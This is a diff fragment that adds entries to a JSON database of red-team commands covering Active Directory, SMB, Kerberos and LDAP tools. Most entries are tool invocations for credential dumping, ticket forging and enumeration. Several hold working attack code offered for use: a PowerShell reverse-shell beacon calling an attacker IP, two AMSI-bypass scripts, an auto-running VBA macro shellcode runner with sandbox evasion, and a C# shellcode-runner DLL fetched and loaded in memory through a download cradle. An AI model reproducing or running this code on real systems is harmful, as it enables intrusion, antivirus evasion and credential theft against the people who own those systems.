+      "Username",
+      "Password"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"
+    ],
+    "name": "SMBClient-List-Shares"
+  },
+  {
+    "description": "Impacket's addcomputer.py will add a computer account to the domain and set its password. The following command will create a new computer over LDAPS. Plain LDAP is not supported, as it doesn't allow setting the password of the new computer.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tNew Computer Password: TestPassword123\n\n\tNew Computer Name: testComputer\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 addcomputer.py -method LDAPS -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "LDAP"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "Persistence"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py",
+      "http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html"
+    ],
+    "name": "Impacket-addcomputer-LDAPS"
+  },
+  {
+    "description": "xfreerdp is an X11 Remote Desktop Protocol (RDP) client which can be used to connect to servers which allow incoming RDP connection. Besides normal username/password login it support a Pass the Hass attack.\n\nCommand Reference:\n```\nUsername: mmaas\n\nPassword: password@1\n\nIP address: 10.0.0.1\n\nHash: /pth:hash\n```\n",
+    "command": "xfreerdp /u:'mmaas' /p:'password@1' /v:10.0.0.1\n",
+    "items": [
+      "Username",
+      "Password",
+      "Hash"
+    ],
+    "services": [
+      "RDP"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Persistence"
+    ],
+    "references": [
+      "https://www.mankier.com/1/xfreerdp",
+      "https://kali.org/blog/passing-hash-remote-desktop/"
+    ],
+    "name": "xfreerdp-connection"
+  },
+  {
+    "description": "Rubeus' `asktgt` module uses a valid user's NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.\n\nCommand Reference:\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tHash: 2a3de7fe356ee524cc9f3d579f2e0aa7\n",
+    "command": "Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt\n",
+    "items": [
+      "Hash",
+      "Username"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/GhostPack/Rubeus",
+      "https://github.com/GhostPack/Rubeus#asktgt"
+    ],
+    "name": "Rubeus-AskTGT"
+  },
+  {
+    "description": "Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account using the hashed password of user `john` and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tService: www\n\n\tHost Name: server01.test.local\n\n\tUsername: john\n\n\tHash: :2a3de7fe356ee524cc9f3d579f2e0aa7\n\n\tImpersonated User: Administrator\n",
+    "command": "python3 getST.py -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7 -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john\n",
+    "items": [
+      "Hash",
+      "Username"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "PrivEsc",
+      "Persistence"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py",
+      "http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html"
+    ],
+    "name": "Impacket-getST-Hash"
+  },
+  {
+    "description": "Hoaxshell is a Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell. Be aware that the default payload is detected by AMSI so obfuscate it with quotes and capitals an d check if against AmsiTrigger.\n\nCommand Reference:\n```\nIP address of attacking machine: 10.10.21.14\n\n-H: standard or custom http header name to avoid detection\n```\n",
+    "command": "python3 hoaxshell.py -s 10.10.14.123 -r -H \"Authorization\"\n",
+    "code": "Obfucate the generated payload, by adding quotes and capitals, and check against AmsiTrigger:\n\n$s='10.10.14.123:8080';$i='a057fd22-2e58ab4e-cdf23a08';$p='http://';$v=Invoke-Web''Request -UseBasicParsing -Uri $p$s/a057fd22 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-WebRequest -USEBasicParsing -Uri $p$s/2e58ab4e -Headers @{\"Authorization\"=$i}).Content;if ($c -ne 'None') {$r=i''ex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/cdf23a08 -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Persistence",
+      "Injection",
+      "Bypassing"
+    ],
+    "references": [
+      "https://github.com/t3l3machus/hoaxshell",
+      "https://m.youtube.com/watch?v=fgSARG82TJY",
+      "https://github.com/RythmStick/AMSITrigger"
+    ],
+    "name": "Hoaxshell"
+  },
+  {
+    "description": "Seatbelt.exe is part of the GhostPack suite of tools that will perform a lot of \"safety checks\" on the Windows host and collect system data that could be useful for potential privilege escalation or persistence methods. The following command will run all checks on the system and store the output in a file (WARNING: will collect a lot of data. remove `-full` for less output).\n\nCommand Reference:\n\n\tRun all checks: -group=all\n\n\tOutput File: output.txt\n",
+    "command": "Seatbelt.exe -group=all -full > output.txt\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "PrivEsc",
+      "Persistence"
+    ],
+    "references": [
+      "https://github.com/GhostPack/Seatbelt",
+      "https://www.harmj0y.net/blog/redteaming/ghostpack/"
+    ],
+    "name": "Seatbelt"
+  },
+  {
+    "description": "To mount an SMB (Server Message Block) share using the mount command in Linux, you would typically use the cifs filesystem type, which is an implementation of the SMB protocol.\n\nCommand Reference:\n```\nUsername: Guest\n\npassword: empty\n\nShare: //10.129.253.46/Development\n\nLocal folder: devel\n```\n",
+    "command": "mount -t cifs -o vers=2.1,username='Guest',password='' //10.129.253.46/Development devel\n",
+    "items": [
+      "No_creds",
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://www.chrisrmiller.com/mount-samba-share-in-ubuntu/",
+      "https://askubuntu.com/questions/1050460/how-to-mount-smb-share-on-ubuntu-18-04"
+    ],
+    "name": "Mount-SMB"
+  },
+  {
+    "description": "With this code in Powershell it is possible to bypass the AMSI. We\u2019ll modify the assembly instructions themselves instead of the data they are acting upon in a technique known as binary patching. We can use this technique to hotpatch the code and force it to fail even if the data structure is valid. This is done by overwriting the 3 Bytes TEST RDX,RDX with an XOR RAX,RAX instruction, forcing the execution flow to the error branch, which will disable AMSI.\n\nCommand Reference:\n```\nObtain the memory address of AmsiOpenSession (Lookup Function)\n\nModify the memory permissions where AmsiOpenSession is located (Lookup with DelegateType)\n\nModify the three bytes at that location. (TEST RDX,RDX with an XOR RAX,RAX, Copy function)\n```\n",
+    "command": "AMSI bypass in assembly based on the AmsiOpenSession\n",
+    "code": "function LookupFunc { \n  Param ($moduleName, $functionName)\n  \n  $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |\n  Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].\n      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n  $tmp=@()\n  $assem.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\")\n  {$tmp+=$_}} \n  return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)) \n}\n\nfunction getDelegateType {\n  Param (\n      [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,\n      [Parameter(Position = 1)] [Type] $delType = [Void] \n  )\n  $type = [AppDomain]::CurrentDomain.\n  DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\n  $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')\n\n  $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')\n\n  return $type.CreateType() \n}\n\n[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession\n$oldProtectionBuffer = 0\n$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))\n$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) \n\n$buf = [Byte[]] (0x48, 0x31, 0xC0)\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "AV"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Bypassing"
+    ],
+    "references": [
+      "https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Patching-AMSI-AmsiOpenSession"
+    ],
+    "name": "AMSI-Bypass-AmsiOpenSession_Assembly"
+  },
+  {
+    "description": "In this Amsi Bypass it sets the HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable registry key to 0 and run the evil script. Add the code at the beginning of your evil Jscript file to turn off the AMSI.\n\nCommand Reference:\n```\nRegistry key: HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable\n\n-e:  option indicates that the specified script file will be processed by jscript.dll (GUID)\n\nGUID: F414C262-6AC0-11CF-B6D1-00AA00BBBB58\n```\n",
+    "command": "AMSI Bypass in JScript modifying the AmsiEnable registry key\n",
+    "code": "var sh = new ActiveXObject('WScript.Shell');\nvar key = \"HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable\"; \ntry{\n    var AmsiEnable = sh.RegRead(key); \n    if(AmsiEnable!=0){\n    throw new Error(1, '');\n    }\n}catch(e){\n    sh.RegWrite(key, 0, \"REG_DWORD\");\n    sh.Run(\"cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}\"+WScript.ScriptFullName,0,1); \n    sh.RegWrite(key, 1, \"REG_DWORD\");\n    WScript.Quit(1);\n}\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "AV"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Bypassing"
+    ],
+    "references": [
+      "https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/amsi-bypass#jscript"
+    ],
+    "name": "AMSI-Bypass-Jscript_amsienable"
+  },
+  {
+    "description": "Impacket's GetNPUsers.py will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user's password, which can then be cracked offline.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername List: usernames.txt\n\n\tOutput File: hashes.txt\n",
+    "command": "python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt\n",
+    "items": [
+      "Username"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py",
+      "https://www.tarlogic.com/en/blog/how-to-attack-kerberos/"
+    ],
+    "name": "Impacket-GetNPUsers"
+  },
+  {
+    "description": "Impacket's secretsdump.py will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit. The following command will attempt to use the specified machines NTDS.dit and system file to extract the user account hashes associated with that machine.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.2\n\n\tDomain Controller: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 secretsdump.py -ntds C:\\Windows\\NTDS\\ntds.dit -system C:\\Windows\\System32\\Config\\system -dc-ip 10.10.10.1 test.local/john:password123@10.10.10.2\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "Kerberos",
+      "NTLM"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py",
+      "https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy"
+    ],
+    "name": "Impacket-SecretsDump-NTDS"
+  },
+  {
+    "description": "The Get-SQLInstanceDomain identifies all the SQL servers in the domain. This in combination with the Get-SQLConnectionTestThreaded tests whether the credentials supplied allow access to these servers. With this command an attacker can enumerate to which server it has access with found or guessed credentials. This command can be executed from a non-domain joined device, however you need to have reachability to the DomainController\n\nCommand Reference:\n```\nIP address Domaincontroller: 10.0.0.1\n\nDomain: domain.local\n\nUser: mmaas\n\nPassword: Password123\n```\n",
+    "command": "Get-SQLInstanceDomain -Verbose -DomainController 10.0.0.1 -Username domain.local\\mmaas -password Password123| Get-SQLConnectionTestThreaded -Verbose -Threads 3 | Where-Object {$_.Status -like \"Accessible\"}\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "SQL"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet",
+      "https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1"
+    ],
+    "name": "PowerUpSQL-Get-SQLInstanceDomian-credentialAccess"
+  },
+  {
+    "description": "BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a data collector. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.\n\nBloodHound.py is a Python based ingestor for BloodHound, based on Impacket. It allows you to remotely collect data for bloodhound by querying LDAP\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n",
+    "command": "bloodhound.py -d test.local -v --zip -c All -dc test.local -ns 10.10.10.1\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "LDAP"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "references": [
+      "https://github.com/BloodHoundAD/BloodHound",
+      "https://github.com/fox-it/BloodHound.py"
+    ],
+    "name": "BloodHound.py-Remote-Ingestion"
+  },
+  {
+    "description": "Wfuzz has been created to facilitate the task in web applications assessments and it is based on a simple concept: it replaces any reference to the FUZZ keyword by the value of a given payload.\n\nCommand Reference:\n```\n-u for target site: http://flight.htb/\n\n-w for wordlist: https\n\nPlaceholder for vhosts (-H): FUZZ.flight.htb\n\n```\n",
+    "command": "wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \"http://flight.htb/\" -H \"Host: FUZZ.flight.htb\" --hl 154\n",
+    "items": [
+      "No_creds"
+    ],
+    "services": [
+      "Web"
+    ],
+    "OS": [
+      "Windows",
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/xmendez/wfuzz",
+      "https://wfuzz.readthedocs.io/en/latest/"
+    ],
+    "name": "Wfuzz-vhost-discovery"
+  },
+  {
+    "description": "Impacket's secretsdump.py will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit. The following command will attempt to dump all secrets from the target machine using the previously mentioned techniques.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 secretsdump.py test.local/john:password123@10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "Kerberos",
+      "NTLM"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py",
+      "https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy"
+    ],
+    "name": "Impacket-SecretsDump"
+  },
+  {
+    "description": "Responder is an LLMNR, NBT-NS, and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool will only answer to File Server Service request, which is for SMB. The following command will put Responder in analyze mode, listening for NBT-NS, BROWSER, and LLMNR requests without responding.\n\nCommand Reference:\n\n\tInterface: eth0\n",
+    "command": "Responder -I eth0 -A\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "NTLM",
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/lgandx/Responder",
+      "https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/"
+    ],
+    "name": "Responder-Analyze"
+  },
+  {
+    "description": "mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. The following command will respond to DHCPv6 messages and set the DNS server to the attack host IP. Leverage this command with ntlmrelayx.py to capture the WPAD configuration requests. \n\nCommand Reference:\n\n\tDomain: test.local\n",
+    "command": "mitm6 -d test.local --ignore-nofqnd\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "DNS"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/dirkjanm/mitm6",
+      "https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/"
+    ],
+    "name": "Mitm6"
+  },
+  {
+    "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate the SMB host on domain users. \n\nCommand Reference:\n```\nTarget: flight.htb\n\nUser: svc_apache\n\nPassword: test1234\n```\n",
+    "command": "crackmapexec smb flight.htb -u svc_apache -p 'test123' --users\n",
+    "code": "This below command can be used to check for reused passwords, on other users in the users.txt\n\ncrackmapexec smb flight.htb -u users.txt -p 'test123' --continue-on-success\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Enumeration",
+      "Persistence"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/byt3bl33d3r/CrackMapExec",
+      "https://github.com/byt3bl33d3r/CrackMapExec/wiki"
+    ],
+    "name": "Crackmapexec-Enum-SMB-Users"
+  },
+  {
+    "description": "PowerView is a module within PowerSploit written in PowerShell to gain network situational awareness on Windows domains. The below command will query the Domain Controller for all domain users.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n",
+    "command": "Get-DomainUser -Domain test.local -DomainController 10.10.10.1\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon",
+      "https://www.attackdebris.com/?p=470"
+    ],
+    "name": "PowerView-Get-DomainUser"
+  },
+  {
+    "description": "Shellcode runner in a VBA macro can be used inside a Office product. This code make use of encrypted shellcode with XOR and has a Sleep function which ensures that it is not tested against an AV emulator.\n\nCommand Reference:\n\n\tbyte[] buf: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a\n",
+    "command": "VBA ShellcodeRunner macro to use in Office products\n",
+    "code": "Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr\nPrivate Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr\nPrivate Declare PtrSafe Function Sleep Lib \"kernel32\" (ByVal mili As Long) As Long\nPrivate Declare PtrSafe Function FlsAlloc Lib \"kernel32\" (ByVal lpCallback As LongPtr) As Long\n\nSub Document_Open()\n  ShellcodeRunner\nEnd Sub\n\nSub AutoOpen()\n  ShellcodeRunner\nEnd Sub\n\nFunction ShellcodeRunner()\n  Dim buf As Variant\n  Dim tmp As LongPtr\n  Dim addr As LongPtr\n  Dim counter As Long\n  Dim data As Long\n  Dim res As Long\n  Dim dream As Integer\n  Dim before As Date\n\n  ' Check if we're in a sandbox by calling a rare-emulated API\n  If IsNull(FlsAlloc(tmp)) Then\n    Exit Function\n  End If\n\n  ' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction\n  dream = Int((1500 * Rnd) + 2000)\n  before = Now()\n  Sleep (dream)\n  If DateDiff(\"s\", t, Now()) < dream Then\n    Exit Function\n  End If\n\n  ' msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.240.178 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a\n  buf = Array(31, 33, ..., 33, 37)\n\n  ' XOR-decrypt the shellcode\n  For i = 0 To UBound(buf)\n    buf(i) = buf(i) Xor Asc(\"a\")\n  Next i\n\n  ' &H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE\n  ' &H40 = 0x40 = PAGE_EXECUTE_READWRITE\n  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)\n\n  For counter = LBound(buf) To UBound(buf)\n    data = buf(counter)\n    res = RtlMoveMemory(addr + counter, data, 1)\n  Next counter\n\n  res = CreateThread(0, 0, addr, 0, 0, 0)\nEnd Function\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Persistence",
+      "Injection"
+    ],
+    "references": [
+      "https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/shellcode-runners#c-dll-with-powershell-cradle-in-memory"
+    ],
+    "name": "ShellcodeRunner-VBA"
+  },
+  {
+    "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. The following command will enumerate a list of SMB hosts with signing not enforced, allowing you to relay credentials to them using ntlmrelayx.py.\n\nCommand Reference:\n\n\tSMB Hosts: smb_hosts.txt\n",
+    "command": "crackmapexec smb smb_host.txt --gen-relay-list output.txt\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/byt3bl33d3r/CrackMapExec",
+      "https://github.com/byt3bl33d3r/CrackMapExec/wiki"
+    ],
+    "name": "Crackmapexec-Enum-SMB-Relay-List"
+  },
+  {
+    "description": "Shellrunner in managed DLL, with the below code you can create a DLL that hold an meterpreter shell. Host this DLL on your webserver and retrieve it via the second part of the code, which makes sure the DLL is directly loaded into the memory of the Windows machine.\n\nCommand Reference:\n\n\tbyte[] buf: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a\n",
+    "command": "$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.21/ShellcodeRunner.dll')\n\n$assem = [System.Reflection.Assembly]::Load($data)\nor (for local file)\n$assem = [System.Reflection.Assembly]::LoadFile(\"C:\\user\\documents\\ClassLibrary1.dll\")\n\n$class = $assem.GetType(\"ShellcodeRunner.Program\")\n$method = $class.GetMethod(\"Run\")\n$method.Invoke(0, $null)\nOr\n$a = [ShellcodeRunner.Program]::Run()\n```\n",
+    "code": "using System;\nusing System.Runtime.InteropServices;\n\nnamespace ShellcodeRunner\n{\n    public class Program\n    {\n        [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n        [DllImport(\"kernel32.dll\")]\n        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n        [DllImport(\"kernel32.dll\")]\n        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\n        [DllImport(\"kernel32.dll\")]\n        static extern void Sleep(uint dwMilliseconds);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);\n\n        [DllImport(\"kernel32.dll\")]\n        static extern IntPtr GetCurrentProcess();\n\n        public static void Run()\n        {\n            // Check if we're in a sandbox by calling a rare-emulated API\n            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)\n            {\n                return;\n            }\n\n            // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction\n            var rand = new Random();\n            uint dream = (uint)rand.Next(10000, 20000);\n            double delta = dream / 1000 - 0.5;\n            DateTime before = DateTime.Now;\n            Sleep(dream);\n            if (DateTime.Now.Subtract(before).TotalSeconds < delta)\n            {\n                Console.WriteLine(\"Charles, get the rifle out. We're being fucked.\");\n                return;\n            }\n\n            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a\n            byte[] buf = new byte[657] {0x9d,0x29,0xe2, [...]\n                            ,0x9e,0xb4};\n\n            // XOR-decrypt the shellcode\n            for (int i = 0; i < buf.Length; i++)\n            {\n                buf[i] = (byte)(buf[i] ^ (byte)'a');\n            }\n\n            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);\n            Marshal.Copy(buf, 0, addr, buf.Length);\n            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n            WaitForSingleObject(hThread, 0xFFFFFFFF);\n        }\n    }\n}\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Persistence",
+      "Injection"
+    ],
+    "references": [
+      "https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/shellcode-runners#c-dll-with-powershell-cradle-in-memory"
+    ],
+    "name": "ShellcodeRunner-DLL"
+  },
+  {
+    "description": "ldapsearch is a Linux based tool that opens a connection to an LDAP server, binds, and performs a search using specified parameters. The following command will attempt to find sensitive information (such as leaked creds), by querying all LDAP objects, essentially dumping all the data that an anonymous user can access.\n\nCommand Reference:\n\n\tDomain: test.local\n",
+    "command": "ldapsearch -LLL -x -H ldap://test.local -b'' -s base '(objectclass=\\*)'\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "LDAP"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://linux.die.net/man/1/ldapsearch"
+    ],
+    "name": "LDAPSearch-NoCreds"
+  },
+  {
+    "description": "Impacket's atexec.py uses the Task Scheduler service on the remote Windows host to execute the given command. It will create a windows task with a random name, trigger the task, and then delete it. The following command executes `whoami` on the remote Windows host.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n\n\tCommand Executed: whoami\n",
+    "command": "python3 atexec.py test.local/john:password123@10.10.10.1 whoami\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py",
+      "https://u0041.co/blog/post/1"
+    ],
+    "name": "Impacket-atexec-Creds"
+  },
+  {
